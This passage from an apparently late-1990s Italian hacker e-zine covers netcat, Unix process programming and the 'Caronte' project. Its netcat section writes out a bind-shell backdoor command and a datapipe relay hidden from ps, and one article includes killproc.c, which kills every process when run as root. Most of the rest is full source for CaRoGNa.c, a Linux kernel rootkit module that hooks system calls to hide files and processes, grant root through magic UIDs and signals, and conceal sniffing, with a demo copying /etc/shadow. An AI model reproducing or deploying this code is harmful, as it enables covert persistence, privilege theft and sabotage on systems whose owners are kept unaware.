250 uno... Sender ok
rcpt to: root
250 root... Recipient ok
data
354 Enter mail, end with "." on a line by itself
Test
.
250 MAA00540 Message accepted for delivery
quit
221 XXXX closing connection

Uno dei vantaggi della modalita' client del netgatto e' l'assenza di opzioni
che possano in qualche modo interferire con l'invio di file binari come
avviene con il telnet e la possibilita' di usare l'UDP.

Le opzioni sono le seguenti:

-v [verbose mode] Permette di avere informazioni relative alla connessione.
Per esempio sul mio computer ho disabilitato il servizio pop, quindi in un
tentativo di connessione alla mia porta 110 il netcat avrebbe come output:

localhost [127.0.0.1] 110 (pop-3) : Connection refused

Usando come parametro -vv anziche' -v si avranno ancora piu' informazioni:

esempio (mandando il cmd quit in una connessione alla porta smtp)

l'output sara':

sent 5, rcvd 105

-n [only ip address] L'indirizzo a cui netcat deve connettersi verra' accettato
solo se sara' nel formato decimale puntato altrimenti riceverete come error per
esempio:

Can't parse localhost as an IP address

-w nsec [timeout connection] Questo parametro seguito dal numero di secondi ci
indica quanto tempo la connessione deve stare in piedi.

-u [UDP] questo parametro dice a netgatto di utilizzare l'User Datagram Protocol
anziche' il TCP

-g e -G sono due parametri per verificare l'instradamento (non vi serviranno)

-o file [HEX DUMP] vi permette di salvare il dump della connessione in un
file: e' sicuramente utile se dovete loggare altrimenti rallenta soltanto il
netcat.

-l serve per aspettare una connessione su una determinata porta stabilita dal
 parametro -p 

-p ports [GRAB] serve a grabbare una porta. Questo puo' essere MOLTO UTiLE se
accoppiato con il parametro "-l" . Per esempio:

./nc -l -p 1674 </etc/passwd

stabilendo ora una connessione con la porta 1674 del server vi verra' 
visualizzato il file delle passwd

-e  questo parametro non e' abilitato di default vi suggerisco di stabilire
tra le opzioni (quando fate il make  -DGAPING_SECURITY_HOLE) in modo da poter
lanciare un cmd come questo:

./nc -l -p 1674 -e /bin/sh

collegatevi alla porta 1674 e avrete una bella backdoor.

-z questo e' un parametro usato per usare nc come uno scanner

es:
./nc -w 2 -vv -z localhost 10-139

scannera' fino alla porta 139 (a partire dalla 10) il target (in questo caso
localhost)

piccolo esempio di output

localhost [127.0.0.1] 30 (?) : Connection refused
localhost [127.0.0.1] 29 (?) : Connection refused
localhost [127.0.0.1] 28 (?) : Connection refused
localhost [127.0.0.1] 27 (?) : Connection refused
localhost [127.0.0.1] 26 (?) : Connection refused
localhost [127.0.0.1] 25 (smtp) open
localhost [127.0.0.1] 24 (?) : Connection refused
localhost [127.0.0.1] 23 (telnet) open
localhost [127.0.0.1] 22 (?) : Connection refused
localhost [127.0.0.1] 21 (ftp) open
localhost [127.0.0.1] 20 (ftp-data) : Connection refused
localhost [127.0.0.1] 19 (chargen) : Connection refused
localhost [127.0.0.1] 18 (?) : Connection refused
localhost [127.0.0.1] 17 (qotd) : Connection refused
localhost [127.0.0.1] 16 (?) : Connection refused
localhost [127.0.0.1] 15 (netstat) : Connection refused
localhost [127.0.0.1] 14 (?) : Connection refused
localhost [127.0.0.1] 13 (daytime) : Connection refused
localhost [127.0.0.1] 12 (?) : Connection refused
localhost [127.0.0.1] 11 (systat) : Connection refused
localhost [127.0.0.1] 10 (?) : Connection refused

E' poi possibile utilizzare il netcat anche come datapipe:

esempio suggerito:

-----exfile----- 
(ricordarsi di fare chmod +x exfile ! altrimenti avrete un bel 
permission denied)

#! /bin/sh
exec ./nc fanculo.it 23
-----------------

nc -l -p 31000 -e exfile &

e a questo punto basta eseguire dal client

telnet target-vittima-del-netgatto 31000

e sarete collegati a fanculo.it con l'ip del target-vittima-del-netgatto.
                 
Questa e' solo un'idea che vi fornisco.
Anzi il mio consiglio e' quello di eseguire:

./nc
Cmd line: -l -p 31000 -e exfile 
date un bel Ctrl-Z
e un bg per mettere il processo in background

In questo modo facendo con ps non si vedranno i parametri e quindi il datapipe
sara' piu' difficile da scoprire.
Non potete scrivere al cmd line una & perche' sara' interpretata come un 
parametro del netcat e non come una richiesta di mettere il processo in
background.

L'ultimo e classico esempio del netgatto e' quello di provare buffer overflow.

es di sintassi:
(hackttpd 0; cat) | nc victim 143

ok byez
	pIGpEN

----------------[ PR0GRAMMAZi0NE UNiX: GESTi0NE DEi PR0CESSi ]----------------
---------------[ PARTE I : iNTR0DUZi0NE AL M0ND0 DEi PR0CESSi ]---------------
----------------------------------[ pIGpEN ]----------------------------------

In questa prima parte mi occupero' di descrivere le cose basiliari per poter
comprendere quello che sara' poi il vero kernel di questi articoli e cioe' il
controllo e la gestione dei processi in ambiente unix.
Partiro' subito con una distinzione che mi sembra scontata per chi intende
affrontare questa lettura, ossia la differenza tra programma e processo.
Il programma non e' altro che una serie di istruzioni eseguibili e quindi
anche comprensibili, dall'elaboratore.
Il processo e' invece un programma (o una sua parte) che si trova in memoria
in stato di esecuzione, il quale, a differenza del programma:

- si evolve nel tempo
- e' sequenziale (il programma contiene invece anche cicli e/o salti)

Un processo si puo' trovare in vari stati:

- parking (parcheggio) quando attende che gli venga assegnata una zona in
  memoria centrale
- ready (pronto) quando attende che gli venga assegnata la CPU
- executing (esecuzione) quando il processo si evolve grazie alla CPU.
- wait (attesa) quando il processo richiede un'operazione di I/O su una
  periferica.
- ending (terminazione) quando e' stato terminato e viene tolto dalla memoria
  centrale.

Ci saranno quindi dei passaggi di stato:

() parking ---> ready    il processo si trova in memoria centrale e attende
                         l'uso della CPU
() ready ---> executing  al processo e' stata assegnata la CPU e ha a
                         disposizione il suo quanto di tempo (time slice)
() executing ---> ready  quando scade il time slice
() executing ---> wait   quando c'e' richiesta di un'operazione di I/O (il
			 time slice non necessariamente e' scaduto). Al
			 processo viene tolta la CPU.
() wait ---> ready       il processo ha terminato l'operazione di I/O e viene
                         accodato in attesa di utilizzare nuovamente la CPU.
() executing ---> ending il processo ha completato la sua evoluzione.

	        PARKiNG
        	  ||
	          \/
	         READY  time slice expired
                  || <===========
                  \/     I/O   ||
               EXECUTiNG ===> WAiT
	          ||
        	  \/
	        ENDiNG

Quando si verifica una richiesta di I/O viene inviato un segnale di
interruzione alla CPU (interrupt) che la obbliga ad interrompere lo stato di
esecuzione indipendentemente (come ho gia' detto) se il time slice e' stato
completato o meno.
Vi ricordo pure che questi interrupt sono asincroni e differiscono da quelli
sincroni in quanto non sono riconducibili ad una sincronizzazione del clock
interno, anzi tendono piuttosto a dipendere da fattori esterni al sistema.
Quando si verifica un interrupt occorre naturalmente salvare il contenuto
dei registri della CPU prima dell'interrupt e questo si ottiene copiando i
valori in una zona della memoria centrale chiamata vettore di interrupt.

Lo Unix gestisce i processi attraverso un identificatore (Process
IDentification) e cioe' un numero intero scelto nel range da 0 a 30000.
Il PID viene assegnato al momento dellla creazione del processo e quindi in
genere il suo numero varia a secondo di quando viene creato.
Ci sono tuttavia dei processi che essendo eseguiti sempre e per prima si
ritroveranno ad avere lo stesso PID.

es.

Numero PID       Nome Processo

0                swapper (scheduler)
1                init
2                pagedaemon

A parte questi se non cambiate configurazione potrete notare che dopo il
boot,
lanciando il "ps", molti demoni avranno lo stesso PID del boot precedente
(mi sembra ovvio :)
L'identification e' anche importante come ben saprete per distinguere utenti,
gruppi e permessi ai file.
In quest'ultimo esempio per esempio se volete verificare l'uid ed il gid
bastera' includere questa parte al sorgente:


#include<sys/stat.h>
.
.
.
struct stat *buffer;
.
.
.
stat(nomefile,&buffer);
/* in buffer.st_uid e buffer.st_gid troverete i numerini magici */

- ID del PROCESSO e ID del GRUPPO DI PROCESSO

Per non far confusione bisogna distinguere l'id del processo da quello del
gruppo del processo.
Il primo non sara' mai uguale a quello di un altro processo e lo identifica
quindi univocamente.
Il secondo e' l'identificazione di un gruppo di processi e come tale uguale
per tutti quelli appartenenti al gruppo.

Quindi un processo ha:

- l'ID del processo
- l'ID del gruppo di processi a cui appartiene.

Nel caso in cui l'id del processo e quello del gruppo di processi sono uguali
si parla del leader del gruppo dei processi.

Il valore dell'ID del gruppo di processi e' ottenibile attraverso la
funzione:

int getpgrp(int pid);

con pid=0 (o semplicemente omesso) per sapere l'id di gruppo del processo
corrente o con pid=qualkosa per sapere quello di quel determinato processo.
E' possibile cambiare l'ID del processo di gruppo attraverso la funzione:

int setpgrp(int pid, int pgrp);

con pid=0 sempre se ci si riferisce al processo corrente.
Bene per questa prima parte puo' bastare spero di essere stato chiaro.

byez

pIGpEN

----------------[ PR0GRAMMAZi0NE UNiX: GESTi0NE DEi PR0CESSi ]----------------
---------------------------------[ PARTE II ]---------------------------------
----------------------------------[ pIGpEN ]----------------------------------

AUT0RE: pIGpEN (il vero :)
C0NSUM0: 2 bustine di Baiocchi del Mulino Bianco
	 1 Sprite in lattina
MUSiCA ASC0LTATA: JiMi HeNdRiX - CHEROKEE
THANX: ins4ne (per il monitor)
       il pub X-X-X-X-X-X-X-X per aver messo nella lista due panini:
       PIG e PINK PIG .... entrambi in vendita a Lit. 6.000 
       e per avermi dato l'idea di chiamare il mio ping troiano PING PIG :)
TEMPO: GRIGiO --- piuttosto brutto
DEDiCAT0 a Chi ScRiSSe PeR La PriMa VoLtA:
	"Legalizzare la droga?
	Ma Piantatela ... "

"Na-Na-Na-Na Na-Na-Na-Na ..... she's a fox .... Na-Na-Na-Na-Na"

--- SEGNALi ---

I segnali sono degli interrupt software di cui in genere non si conosce quando
essi si presentano e per questo sono anch'essi asincroni come quelli di cui
parlavo nel primo articolo.
Essi hanno il compito di inviare ad un processo un segnale a cui corrisponde
un'azione. Questi segnali possono essere inviati o dal kernel o da un altro
processo.
Esempi di questi segnali possono essere la violazione della segmentazione
(SIGSEGV) a cui corrispondera' l'azione di terminazione del processo, oppure
viene superato il limite della dimensione del file (SIGXFSZ) per cui il
processo sara' terminato ecc....
Tutti questi segnali li potete trovare all'interno del file signal.h o simili
(in linux il file signal vi manda a cercarli sul signum.h :)

/* Signals.  */
#define SIGHUP          1       /* Hangup (POSIX).  */
#define SIGINT          2       /* Interrupt (ANSI).  */
#define SIGQUIT         3       /* Quit (POSIX).  */
#define SIGILL          4       /* Illegal instruction (ANSI).  */
#define SIGTRAP         5       /* Trace trap (POSIX).  */
#define SIGABRT         6       /* Abort (ANSI).  */
#define SIGIOT          6       /* IOT trap (4.2 BSD).  */
#define SIGBUS          7       /* BUS error (4.2 BSD).  */
#define SIGFPE          8       /* Floating-point exception (ANSI).  */
#define SIGKILL         9       /* Kill, unblockable (POSIX).  */
#define SIGUSR1         10      /* User-defined signal 1 (POSIX).  */
#define SIGSEGV         11      /* Segmentation violation (ANSI).  */
#define SIGUSR2         12      /* User-defined signal 2 (POSIX).  */
#define SIGPIPE         13      /* Broken pipe (POSIX).  */
#define SIGALRM         14      /* Alarm clock (POSIX).  */
#define SIGTERM         15      /* Termination (ANSI).  */
#define SIGSTKFLT       16      /* ??? */
#define SIGCLD          SIGCHLD /* Same as SIGCHLD (System V).  */
#define SIGCHLD         17      /* Child status has changed (POSIX).  */
#define SIGCONT         18      /* Continue (POSIX).  */
#define SIGSTOP         19      /* Stop, unblockable (POSIX).  */
#define SIGTSTP         20      /* Keyboard stop (POSIX).  */
#define SIGTTIN         21      /* Background read from tty (POSIX).  */
define SIGTSTP          20      /* Keyboard stop (POSIX).  */
#define SIGTTIN         21      /* Background read from tty (POSIX).  */
#define SIGTTOU         22      /* Background write to tty (POSIX).  */
#define SIGURG          23      /* Urgent condition on socket (4.2 BSD).  */
#define SIGXCPU         24      /* CPU limit exceeded (4.2 BSD).  */
#define SIGXFSZ         25      /* File size limit exceeded (4.2 BSD).  */
#define SIGVTALRM       26      /* Virtual alarm clock (4.2 BSD).  */
#define SIGPROF         27      /* Profiling alarm clock (4.2 BSD).  */
#define SIGWINCH        28      /* Window size change (4.3 BSD, Sun).  */
#define SIGPOLL         SIGIO   /* Pollable event occurred (System V).  */
#define SIGIO           29      /* I/O now possible (4.2 BSD).  */
#define SIGPWR          30      /* Power failure restart (System V).  */
#define SIGUNUSED       31

Evitate di rincoglionirvi nel cercare di ricordarli tutti a memoria se ci
riuscite vuol dire che avete scritto abbastanza programmi.
Ma come si invia un segnale?
Attraverso la chiamata di sistema kill che a differenza di quello che molti
pensano non necessariamente ha come azione la terminazione del processo.

int kill(int pid, int sig);

Naturalmente l'ID dell'utente deve avere il permesso di fare qualcosa su
quel processo o quest'ultimo deve essere eseguito da un bel bimbo con uid 0 :)

Il primo argomento della funzione (pid) se vale:

() 0 il segnale viene inviato a tutti i processi del gruppo di quello che
     lo ha generato
() -1 nel caso di superuser il segnale interessera' tutti i processi
      diversi da quelli di sistema (quindi lo swapper e l'init saranno
      esclusi)
      nel caso di altro utente riguardera' solo quel gruppo di processi
      con ID uguali all'EUID del processo che lo ha generato (e' un casino
      a scriversi, ma facile a farsi)
() -n (dove n e' un numero diverso da -1 con il segno negativo davanti)
      il segnale verra' inviato a tutti i processi con ID uguali al
      valore assoluto del pid.  

Per quanto riguarda il secondo argomento e' sempre maggiore di 0 e gli
"alias" li potete trovare come ho gia' detto ne file signal.h .
L'unica volta in cui il signal e' uguale a zero e' quando si vuole
verificare la validita' del pid.
A questo punto qualche cattivo bambino potrebbe gia' pensare a scrivere
dei programmi che generano errori nei processi provocando per esempio la
terminazione di tutti i processi degli utenti e del vero root con una
bella funzioncina kill settata con pid -1, magari che dite mettiamo questo
programmino come cron.
Beh vi auguro che il sysadmin vi prenda e vi dia tante sberle da non farvi
arrivare piu' un signal al vostro fottuto cervello.

Questo programma l'ho scritto per la mia capacita' (non voluta) di mandare
a puttane tutto quanto (parlo della true life :)

killproc.c
------------------------ usa le forbici qui ----------------------------------
/* If YOU USE THIS PROGRAM YOU KiLL ALL (IF YOU'RE ROOT) .... DON'T USE IT !
   KILL A PROCESS LIKE INETD ON A SERVER IS NOT A GOOD THING ... */

#include<stdio.h>
#include<signal.h>
#include<string.h>

#define ERROR -1

main(int argc, char *argv[])
{
if(argc!=2) {
printf("\n Kill process --- A SiMpLe PrOGrAm WrIttEn By pIGpEN / S0ftPr0ject
                         f0R Butchered fR0M iNSiDe\n");
printf("\n\n\nUsage: %s mode\n",argv[0]);
printf("mode: stoplife ---> stop all\n");
printf("      killproc ---> kill all\n");
printf("If you use this program you're a killer :|\n");
exit(ERROR);
}

if(strcmp(argv[1],"stoplife")==0) kill(-1,SIGSTOP);
if(strcmp(argv[1],"killproc")==0) kill(-1,SIGKILL);
}
------------------------ usa la motosega qui ---------------------------------

Tenete presente che i segnali non sono generati soltanto dall'utente, ma
anche da particolari condizioni hardware...
Potrebbe essere che un determinato segnale non venga cagato da parte del
processo.
Questo perche' esistono delle istruzioni che possono essere riassunte in
modalita' umana in una funzione signal con secondo argomento SIG_IGN.

es.

signal(SIGTERM,SIG_IGN);

impedisce la terminazione software del processo.

L'ignore di un segnale e' una delle caratteristiche dei kernel successivi
alla preistoria e cioe' quelli che hanno di nuovo delle funzioni di
blocking e holding.

--- BL0CKiNG ---

Per il blocking una delle funzioni usate e':

int sigblock (int mask);

dove mask e' precedentemente definita per esempio in questo modo:

int mask=sigmask(SIGQUIT);

Quindi noi potremo svolgere il nostro lavoro tranquillamente e poi rendere
di nuovo disponibile la ricezione di tale segnale con la funzione

int sigsetmask(int mask);

E' possibile settare una maschera con piu' segnali attraverso il carattere
"|"

es. mask=sigmask(SIGQUIT) | sigmask(SIGINT);

--- H0LDiNG ---

Un esempio di holding al fine di mantenere un certo stato e' il seguente:



oldmask=sigblock(sigmask(SIGQUIT)|sigmask(SIGINT)); // salviamo la maskera
.............
sigsetmask(oldmask); // ricarichiamo la maskera

L'holding varia poi da sys a sys ... per esempio nel sys V esistono due
funzioni chiamate sighold e sigrelse per cui il codice presente
risulterebbe:

sighold(SIGQUIT);
sighold(SIGINT);
.............
sigrelse(SIGQUIT);
sigrelse(SIGINT);

--- V0GLi0 UNA F0RKETTA ---

Concludero' questo articolo con la funzione fork.
Essa e' indispensabile per creare una gerarchia dei processi.
Un tipico esempio della sua utilita' e' quella dell'accesso ad una
determinata porta di un server.
Per fare in modo che sia possibile accedere per esempio all'ftp
contemporaneamente con altri client che accedono al servizio occorre
generare dei processi figli con le loro porte di connessione ... se non vi
e' chiaro guardatevi gli articoli di LordFelix o quello di fusys con il
codice del dpipe.

int fork();

Una caratteristica importante di tale funzione e' che il processo figlio e
quello padre sono indipendenti per quanto riguarda l'apertura e la chiusura
dei file.

L'int restituito e' diverso a secondo se ci troviamo nel processo genitore
dove restituise l'id del child process o del figlio dove restituisce 0.

es.

int childpid;

childpid=fork();
if(childpid==0) { /* processo figlio */ }
if (childpid>0) { /* processo padre  */ }

Nel processo figlio per sapere l'id del processo padre useremo la funzione
getppid() e per sapere quella sua useremo la semplice getpid(), naturalmente
non potremo far riferimento al valore childpid visto che equivale a zero.

es. idiota

------------------------ usa le forbici qui ----------------------------------
#include<stdio.h>

main()
{
int childpid;

childpid=fork();

if (childpid==0)
{
printf("\n\n\nCiao bambino ti trovi nel processo figlio l'id del babbo
e' %d e quello del processo figlio %d",getppid(),getpid());
}

if(childpid>0)
{
printf("\n\n\n\n\n Ciao bambino ti trovi nel processo padre l'id del babbo e'
%d e quello del figlio %d",getpid(),childpid);
}

}
------------------------ usa la motosega qui ---------------------------------

ok bau bau

pIGpEN

------------------------------[ PR0GETT0 CAR0NTE ]----------------------------
------------------------[ PARTE II - iMPLEMENTAZi0NE ]------------------------
-----------------------------------[ FuSyS ]----------------------------------

NO(C)1998 fusys
A scopo informativo e ludico. Ludico NON vuol dire stupido. Se siete stupidi 
nessun testo di questa zine potra' cambiare il vostro fato. Cercate in voi.
Rimuovete il fango e godetevi la luna piena. (E che minchia vor'di ?! ;)

CARONTE. Vigile e ironico alle porte dell'Oblio. Pronto a dischiudervi il
frutto della discordia, la pentola dei mali del mondo (o di root ?) ...
il modulo CaRoGNa ...

###############################################################################
NOTA:	quello che segue e' l'implementazione del modulo CaRoGNa decantato
	ed evocato nella prima parte. In linea di massima, se non capite
	di che cosa io parli vi conviene controllare il primo articolo del
	progetto. In questo invece solo qualche dettaglio relativo al
	modulo in se stesso ed ai suoi usi. Come diapason per il cervello
	solo l'indicazione di possibili modifiche alternative.
###############################################################################

OBIETTIVO

Presto detto, presto fatto. In un nuovo sistema Linux. Con la benedizione
dell'UID == 0 (o maledizione ?) possiamo pensare a cosa fare per rimanere
nel distretto. A come allargare la nostra sfera di influenza. A come poter
sempre colpire rimanendo nell'ombra.

Un LKM. Loadable Kernel Module. Una piccola aggiunta al kernel del nostro
OS preferito e possiamo crearci un habitat ad hoc per le nostre necessita'
psicofisiche. No. Decisamente inondare il sistema di ICMP o di SYN flags
dopo esser stati scacciati NON e' elegante. Non e' il caso. Molto meglio
poter rimanere in gioco ma in ombra, occultandoci e nascondendo i tools of
the trade che ci possano servire.

MUBLE MUMBLE

Ok ma cosa cambiare ?

Variare il comportamento di alcuni distretti del kernel puo' esser
pericoloso. Dopo mesi di betatest il nostro modulo potrebbe comunque buttar
giu' il sistema in occasioni particolari. No. L'idea, pubblicamente
introdotta da HalfLife su PHRACK, e' semplice. Ridirottiamo le chiamate di
sistema sul nostro codice. Eseguiamolo in particolari condizioni e poi
ritorniamo i risultati attesi in User Space, in modo da rimanere occultati. 
Ad esempio, ridirottiamo ogni chiamata sys_setuid sul nostro codice.
Eseguiamolo se l'uid richiesto sia di nostro gradimento, dopodiche'
ritorniamo i valori attesi dall'applicazione in ogni altro caso.

Il concetto e' stato portato avanti da Zarq su BUGTRAQ e da Plaguez sempre
su PHRACK. Il modulo che accludo in questo testo non e' altro che una
riscrittura di queste idee, perfettamente funzionante su Linux con kernel
2.0x, quindi quello standard delle varie distro di linuzzo. Si compila
senza problemi e senza warnings. Se non gliela fate a compilarlo scrivete
pure a bfi chiedendo un Makefile. Vi sputero' in un occhio. ;) Nel modulo
c'e' scritto come compilarlo ed utilizzarlo. Punto. AMEN.

Tanto per capirci:

[root@BFI /root]# gcc -c -O2 -fomit-frame-pointer ~fusys/codes/CaRoGNa.c
[root@BFI /root]# insmod CaRoGNa.o
[root@BFI /root]# lsmod
Module         Pages    Used by
[root@BFI /root]# ksyms |grep CaRoGNa
[root@BFI /root]# cat /etc/shadow >> 007shadow
[root@BFI /root]# ls
Xrootenv.0  foo         mail        phun
CaRoGNa.o   docs        hacks.misc  
[root@BFI /root]# ls -la 007shadow
-rw-r--r--   1 root     root          508 Aug 25 15:55 007shadow
[root@BFI /root]# 007exploit
[root@BFI /root]# ps waux |grep 007
[root@BFI /root]# ps
  PID TTY STAT  TIME COMMAND
  243   2 S    0:00 /bin/login -- root
  244   3 S    0:00 /sbin/mingetty tty3
  245   4 S    0:00 /sbin/mingetty tty4
  246   5 S    0:00 /sbin/mingetty tty5
  247   6 S    0:00 /sbin/mingetty tty6
  264   2 S    0:00 -bash
  302   2 R    0:00 ps
[root@BFI /root]# kill -31 264
[root@BFI /root]# ps
  PID TTY STAT  TIME COMMAND
  243   2 S    0:00 /bin/login -- root
  244   3 S    0:00 /sbin/mingetty tty3
  245   4 S    0:00 /sbin/mingetty tty4
  246   5 S    0:00 /sbin/mingetty tty5
  247   6 S    0:00 /sbin/mingetty tty6

[fusys@BFI fusys]$ ps
  PID TTY STAT  TIME COMMAND
  242   1 S    0:00 /bin/login -- fusys
  244   3 S    0:00 /bin/login -- fusys
  250   1 S    0:00 -bash
  263   1 S    0:00 pico caronteII.bfi4
  304   3 S    0:00 -bash
  316   3 R    0:00 ps
[fusys@BFI fusys]$ kill -TSTP 304
kill: (304) - Not owner
[fusys@BFI fusys]#

[fusys@BFI fusys]$ chmod 777 /etc/shadow
[fusys@BFI fusys]$ ls -la /etc/shadow
-rwxrwxrwx   1 root     root          508 Apr 30 17:34 /etc/shadow

Questo gia' dovrebbe farvi capire come si possa creare una zona del file
system completamente occultata; come si possano lasciare processi in corso
senza che vengano visti; come sia possibile, una volta scremati i log di
sistema, rimanere online occultando anche la propria istanza di shell ...
in piu' e' possibile avere accessi mediante open e setuid, e nascondere la
flag PROMISC delle interfacce di rete mediante ioctl ...

Al tempo, sulla home di BFI, update ed aggiunte alle system call troiane.

Vediamo ora il codice.

--------------------------- taglia qui -------------------------------------

/*
 * CaRoGNa.c			Implementazione del modulo CaRoGNa.
 *				Per maggiori informazioni leggete gli
 *				articoli relativi al progetto CaRoNTe sui
 * 				numeri 3 e 4 di BFI, prelevabile da
 *				http://bfi98.home.ml.org/
 *				Tecnica Segreta n.1 della divina scuola
 *				dell' HOKUHACKO. Sacro Colpo del Modulo
 *				che Travolge la Radice. 
 *
 *
 *				assolutamente NO (C)1998 FuSyS
 *
 * NOTA: questo modulo e' il frutto del divertimento e della curiosita', 
 *	 della ricerca della conoscenza sulla via dell' HackerDom. Ogni	 
 *	 utilizzo non corrispondente a queste idee e' VIVAMENTE SCONSIGLIATO.
 *	 Questo codice richiede piu' furbizia, impegno e lavoro da parte
 *	 del solito ragazzino pieno di scriptz, warez, ed 3l337n355 =:?  
 *	 man brain per favore. :)
 *
 * Compilate con: 	gcc -c -O2 -fomit-frame-pointer CaRoGNa.c
 * Installate con:	insmod CaRoGNa.o
 * 
 * 3l33t quote: 	"wow, e funzica anche su Solaris ?"  
 *
 * Thanks:		HalfLife, Zarq, Plaguez
 */

#define MODULE			
#define __KERNEL__
#include <linux/module.h>

#include <linux/fs.h>
#include <linux/dirent.h>
#include <linux/proc_fs.h>
#include <linux/types.h>
#include <linux/stat.h>
#include <linux/fcntl.h>
#include <linux/mm.h>
#include <linux/if.h>
#include <sys/syscall.h>
#include <asm/unistd.h>

#define SUBVISUS	"007"	
#define SIGNIHIL        31
#define FL_DISAPPEAR    0x70000000
#define SACROUID        7777
#define KING            501
#define	OPENFILE	6666

#undef fsuser()
#define fsuser()	((current->fsuid==0)||(current->fsuid==KING))

inline int suser(void)
{
        if ((current->euid == 0)||(current->euid == KING)) {
                current->flags |= PF_SUPERPRIV;
                return 1;
        }
        return 0;
}

int promisc;

int (*old_kill) (pid_t, int) ;
int (*old_getdents) (unsigned int, struct dirent *, unsigned int) ;
int (*old_setuid) (uid_t) ;
int (*old_chmod) (const char*, mode_t) ;
int (*old_ioctl) (unsigned int, unsigned int, unsigned long) ;
int (*old_open) (const char *, int, mode_t) ;

extern void *sys_call_table[] ;

int atoi(char str[])
{
    int res = 0;
    int i ;
    for(i = 0; str[i] >='0' && str[i] <='9'; ++i)
	res = 10 * res + str[i] - '0';
    return res;
}

/* /usr/src/linux/fs/proc/array.c */
struct task_struct *get_task(pid_t pid)
{
    struct task_struct *p = current;
    do {
        if (p->pid == pid)
            return p;
        p = p->next_task;
    }
    while (p != current);
        return NULL;
}

/* /usr/src/linux/fs/proc/array.c */
static inline char *task_name(struct task_struct *p, char *buf)
{
    int i;
    char *name;

    name = p->comm;
    i = sizeof(p->comm);
    do {
        unsigned char c = *name;
        name++;
        i--;
        *buf = c;
        if (!c)
            break;
        if (c == '\\') {
            buf[1] = c;
            buf += 2;
            continue;
        }
        if (c == '\n') {
            buf[0] = '\\';
            buf[1] = 'n';
            buf += 2;
            continue;
        }
        buf++;
    }
    while (i);
    *buf = '\n';
    return buf + 1;
}

int secret(pid_t pid)
{
    struct task_struct *task = get_task(pid);
    char *name;
    if (task) {
        name = (char *)kmalloc(200, GFP_KERNEL);
        memset(name, 0, 200);
        task_name(task, name);
        if (strstr(name, SUBVISUS)!=NULL) {
            kfree(name);
            return 1;
        }
    }
    return 0;
}

int killinv(pid_t pid)
{
    struct task_struct *task = get_task(pid);
    char *name;
    if(task == NULL) return 0;
    if (task->flags & FL_DISAPPEAR) {
        return 1;
    }
    return 0;
}

int new_getdents
(unsigned int fd, struct dirent *dirptr, unsigned int count)
{
    unsigned int real ;		
    unsigned int len ;		
				  
    int readen ;		
    int proc ;			

    struct dirent *dirptr2, *dirptr3;	
    struct inode *procinode;	

    real = (*old_getdents) (fd, dirptr, count);

#ifdef __LINUX_DCACHE_H
    procinode = current->files->fd[fd]->f_dentry->d_inode;
#else
    procinode = current->files->fd[fd]->f_inode;
#endif
    if (procinode->i_ino == PROC_ROOT_INO && !MAJOR(procinode->i_dev) &&
    MINOR(procinode->i_dev) == 1)		proc = 1;

    if (real > 0) {	

	dirptr2 = (struct dirent *)kmalloc(real, GFP_KERNEL);
        memcpy_fromfs(dirptr2, dirptr, real);
        dirptr3 = dirptr2;
        readen = real;
         while (readen > 0) {
            len = dirptr3->d_reclen;
            readen -= len;
            if ((strstr((char *)&(dirptr3->d_name), (char *)SUBVISUS) !=NULL)
	       || (proc && secret(atoi(dirptr3->d_name))) 
	       || (proc && killinv(atoi(dirptr3->d_name)))) { 

               if (readen != 0)
                memmove(dirptr3, (char *)dirptr3 + dirptr3->d_reclen, readen);

               else  dirptr3->d_off = 1024;

                real -= len;
            }
            if (dirptr3->d_reclen == 0) {
                real -= readen;
                readen = 0;
            }
            if (readen != 0)
            dirptr3 = (struct dirent *)((char *) dirptr3 + dirptr3->d_reclen);
        }
        memcpy_tofs(dirptr, dirptr2, real);
        kfree(dirptr2);
    }
    return real;
}

int new_kill(pid_t pid, int sig)
{
        int real;
        int errno;
        struct task_struct *task = get_task(pid);

        if ((sig != SIGNIHIL) && (sig != SIGTSTP)) {
                real = (*old_kill)(pid, sig);
                if (real == -1) return(-errno);
                return real;
        }
	if (sig == SIGNIHIL) { 
        	task->flags |= FL_DISAPPEAR;
        	return(0);
	}
	else if (sig == SIGTSTP) {
		task->uid = task->gid = task->euid = task->egid = 0;
        	return(real);
	}
}

int new_setuid(uid_t uid)
{
        int tmp;        
        if (uid == SACROUID) {
                current->uid = 0;               
                current->gid = 0;               
                current->euid = 0;              
                current->egid = 0;              
                return 0;
        } else if (uid == OPENFILE) {
		current->euid = OPENFILE;
		return 0;
	}

        tmp = (*old_setuid) (uid) ;
        return tmp;
}

int new_chmod(const char *filename, mode_t mode)
{
        int ret ;
        if (current->uid == KING) {
          current->uid=current->gid=current->fsuid=current->fsgid=0;
          ret = (*old_chmod) (filename, mode);
          current->uid=current->gid=current->fsuid=current->fsgid=KING;
          return ret;
        } else ret = (*old_chmod) (filename, mode);
        return ret;
}

int new_ioctl
(unsigned int fd, unsigned int cmd, unsigned long arg)
{
        int ret ;
        struct ifreq netif ;

        ret = (*old_ioctl) (fd, cmd, arg);
        if (cmd == SIOCGIFFLAGS && !promisc) {
          memcpy_fromfs((struct ifreq *)&netif, (struct ifreq *)arg,
	  sizeof(struct ifreq));                
	  netif.ifr_flags = netif.ifr_flags & (~IFF_PROMISC);
          memcpy_tofs((struct ifreq *) arg, (struct ifreq *) &netif,
	  sizeof(struct ifreq));        
	} else if (cmd == SIOCSIFFLAGS)
                sys_call_table[SYS_ioctl] = old_ioctl;
        return ret ;
}

int new_open(const char *pathname, int flags, mode_t mode)
{
        int ret;
        if (current->euid == OPENFILE) {
          current->uid=current->gid=current->fsuid=current->fsgid = 0;
          ret = (*old_open) (pathname, flags, mode);
          current->uid=current->gid=current->fsuid=current->fsgid=OPENFILE;
                return ret;
        }
        else ret = (*old_open) (pathname, flags, mode);
        return ret;
}

int init_module(void)
{
     /*	register struct module *mp asm("%ebp");
    	*(char *) (mp->name) = 0;
    	mp->size = 0;
    	mp->ref = 0;		*/

     	register_symtab(NULL);

	old_getdents = sys_call_table[SYS_getdents];
	sys_call_table[SYS_getdents] = (void *) new_getdents;
	old_kill = sys_call_table[SYS_kill];
        sys_call_table[SYS_kill] = (void *) new_kill;
	old_setuid = sys_call_table[SYS_setuid];
        sys_call_table[SYS_setuid] = (void *) new_setuid;
	old_chmod = sys_call_table[SYS_chmod];
	sys_call_table[SYS_chmod] = (void *) new_chmod;
	old_ioctl = sys_call_table[SYS_ioctl];
        sys_call_table[SYS_ioctl] = (void *) new_ioctl;
	old_open = sys_call_table[SYS_open];
        sys_call_table[SYS_open] = (void *) new_open;
	return 0 ;
}

int cleanup_module(void)
{
	sys_call_table[SYS_getdents] = old_getdents;
